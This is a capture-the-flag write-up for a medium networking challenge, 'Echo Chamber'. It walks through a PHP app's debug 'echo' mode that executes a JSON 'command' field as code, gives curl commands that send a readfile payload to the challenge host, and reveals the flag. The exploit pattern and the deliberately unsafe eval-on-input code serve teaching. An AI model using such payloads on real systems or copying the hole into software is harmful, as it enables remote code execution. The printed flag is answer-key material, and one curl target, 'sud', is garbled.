# Echo Chamber

A networking challenge involving **TCP self-connect vulnerabilities** and creative exploitation techniques.

---

## Challenge Info

| Field | Value |
|------|------|
| **Name** | Echo Chamber |
| **Category** | networking |
| **Difficulty** | Medium |
| **Flag** | `DSCCTF{tcp_s3lf_c0nn3ct_3ch0_ch4mb3r_2026}` |
| **Author** | Shadow PB |
| **Files Provided** | Web application source code, Docker setup |

---

## Description

This challenge features a web application that attempts to connect to external TCP ports within a specified range. However, due to the peculiar nature of TCP networking, sometimes connections intended for external hosts can loop back to the application itself.

The application:
- Accepts a `scanner` parameter that defines a port range  
- Has a special "echo test mode" for debugging purposes
- Attempts connections to ports from `scanner` to `scanner + 15`
- Forwards POST data to each connection attempt
- Processes JSON responses in a potentially dangerous way

Your goal is to find and exploit the easier vulnerability path to achieve remote code execution.

---

## Step-by-Step Solution

### Step 1: Discover the Application

First, examine the source code by accessing the application:
```bash
curl "sud"
```

This reveals the PHP source code. Notice there are two main code paths:
1. A complex TCP connection scanning mechanism
2. A simpler "echo test mode" triggered by `?test=echo`

### Step 2: Analyze the Echo Test Mode

Look closely at the code - there's a debug feature:
```php
if (isset($_GET['test']) && $_GET['test'] === 'echo') {
    // Process JSON input and execute commands
}
```

This is much simpler than the TCP self-connect vulnerability!

### Step 3: Test the Echo Mode

Try accessing the echo test mode:
```bash
curl "http://ctf.dscjssstuniv.in:8070/?test=echo" -X POST -d "Hello World"
```

You should see:
```
Echo test mode activated
Received: Hello World
```

### Step 4: Craft the JSON Payload

The echo mode processes JSON and looks for:
- `signal` field with value "Echo"
- `command` field with PHP code to execute

Create the payload:
```json
{"signal":"Echo","command":"readfile('/flag');"}
```

### Step 5: Execute the Exploit

Send the malicious payload to the echo test mode:
```bash
curl "http://ctf.dscjssstuniv.in:8070/?test=echo" \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"signal":"Echo","command":"readfile(\"/flag\");"}'
```

### Step 6: Retrieve the Flag

The application will execute the command and output:
```
Echo test mode activated
Received: {"signal":"Echo","command":"readfile("/flag");"}
Processing command...
DSCCTF{tcp_s3lf_c0nn3ct_3ch0_ch4mb3r_2026}
```

---

## Technical Details

- **Primary vulnerability**: Insecure debug feature with JSON command execution
- **Secondary vulnerability**: TCP self-connect behavior (advanced path)
- The `test=echo` parameter enables a debug mode that processes JSON input
- The echo mode lacks proper input validation and executes arbitrary PHP code
- The original TCP scanning feature still exists for advanced exploitation
- Range reduced from 37 to 15 ports to make scanning more manageable

---

## Files Structure

```
echo_chamber/
├── description.md
├── README.md
├── flag.txt
├── docker-compose.yml
├── Dockerfile
├── src/
│   ├── index.php
│   └── exploit.py
└── solve.py
```

---

## Running the Challenge

```bash
# Build and run the Docker container
docker-compose up -d

# Access the application
curl "http://ctf.dscjssstuniv.in:8070/?probe=50000" -X POST -d '{"signal":"test"}'

# Clean up
docker-compose down
```

---

## Learning Objectives

- **Debug Feature Analysis**: Identifying insecure debug endpoints in web applications
- **JSON Payload Crafting**: Creating malicious JSON payloads for command execution  
- **Parameter Discovery**: Finding hidden parameters and testing modes
- **Code Review Skills**: Reading PHP source to identify vulnerability paths
- **Command Injection**: Exploiting eval() functions with user-controlled input
- **Alternative Exploitation**: Understanding multiple attack vectors in the same application